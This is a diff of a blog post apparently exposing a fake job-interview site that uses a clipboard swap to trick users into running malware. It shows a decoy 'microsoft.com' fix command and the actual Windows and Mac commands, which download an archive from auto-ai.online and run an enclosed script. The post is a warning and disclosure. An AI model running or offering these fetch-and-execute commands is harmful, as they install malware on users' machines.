@@ -78,8 +78,10 @@ THAT'S A BIG FAT NO-NO for anyone reading this to open a terminal and run some c
 
 **Here's what actually got copied:**
 
-```
-curl -k -o "%TEMP%\fixed.zip" "https://auto-ai.online/cam-v-257.fix" && powershell -Command "Expand-Archive -Force -Path '%TEMP%\fixed.zip' -DestinationPath '%TEMP%\fixed'" && wscript "%TEMP%\fixed\update.vbs"
+```bash
+curl -k -o "%TEMP%\fixed.zip" "https://auto-ai.online/cam-v-257.fix" &&
+powershell -Command "Expand-Archive -Force -Path '%TEMP%\fixed.zip' -DestinationPath '%TEMP%\fixed'" &&
+wscript "%TEMP%\fixed\update.vbs"
 ```
 
 Now that my friends, looks sus af 🚨.
@@ -111,8 +113,8 @@ I reported the issue to Hostinger and within a few hours I get this response:
 > Thank you for your report.
 > Listed abusive account(s) has been suspended.
 >
-> Hostinger Abuse Department  
-> abuse@hostinger.com  
+> Hostinger Abuse Department
+> abuse@hostinger.com
 > https://www.hostinger.com
 
 Both talentpreview360.com and auto-ai.online are no longer reachable. I'm impressed by the speed of action!
@@ -159,13 +161,13 @@ The scam presents itself as a legitimate job interview platform with professiona
 
 On Windows the after the camera "errors out" after a couple of seconds, a "How to Fix" popup shows this command to run:
 
-```
+```bash
 curl -L "https://download.microsoft.com/download/graphics-driver-update.exe" -o driver-update.exe && driver-update.exe /silent
 ```
 
 While a technical person would likely be alerted already at this stage, I presume the average user is greatly comforted by the presence of 'microsoft.com' in that domain. When you copy/paste the command, the command that actually gets copied is
 
-```
+```bash
 curl -k -o "%TEMP%\fixed.zip" "https://auto-ai.online/cam-v-257.fix" && powershell -Command "Expand-Archive -Force -Path '%TEMP%\fixed.zip' -DestinationPath '%TEMP%\fixed'" && wscript "%TEMP%\fixed\update.vbs"
 ```
 
@@ -235,7 +237,7 @@ attack will be scanning the system continuously for anything of value. e.g. API 
 
 The command that gets executed on Mac systems:
 
-```
+```bash
 curl -k -o "/tmp/fixed.zip" "https://auto-ai.online/cam-v-257.fix" && unzip -o "/tmp/fixed.zip" -d "/tmp/fixed" && chmod +x "/tmp/fixed/update.sh" && "/tmp/fixed/update.sh"
 ```
 
